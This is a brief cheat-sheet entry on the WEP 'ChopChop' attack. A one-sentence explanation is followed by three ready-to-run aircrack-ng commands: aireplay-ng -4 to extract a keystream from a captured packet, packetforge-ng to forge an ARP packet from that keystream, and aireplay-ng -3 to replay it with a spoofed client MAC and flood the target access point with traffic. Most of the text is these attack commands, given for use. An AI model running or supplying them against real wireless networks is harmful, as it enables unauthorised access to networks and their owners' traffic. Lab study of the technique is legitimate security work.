ChopChop Attack

This is a cryptographic technique that decrypts a WEP packet one byte at a time by exploiting WEP's lack of message integrity,
allowing you to extract the PRGA keystream from a single packet without knowing the WEP key.

aireplay-ng -4 -b $ap_mac -h $local_mac $interface

Then you need to convert the keystream into a .cap file

packetforge-ng --arp -y [keystream.xor] -a $ap_mac -h $local_mac -k 255.255.255.255 -l 255.255.255.255 -w output.cap

Then replay the .cap file to generate traffic

aireplay-ng -3 -b $ap_mac -h $local_mac -r output.cap $interface
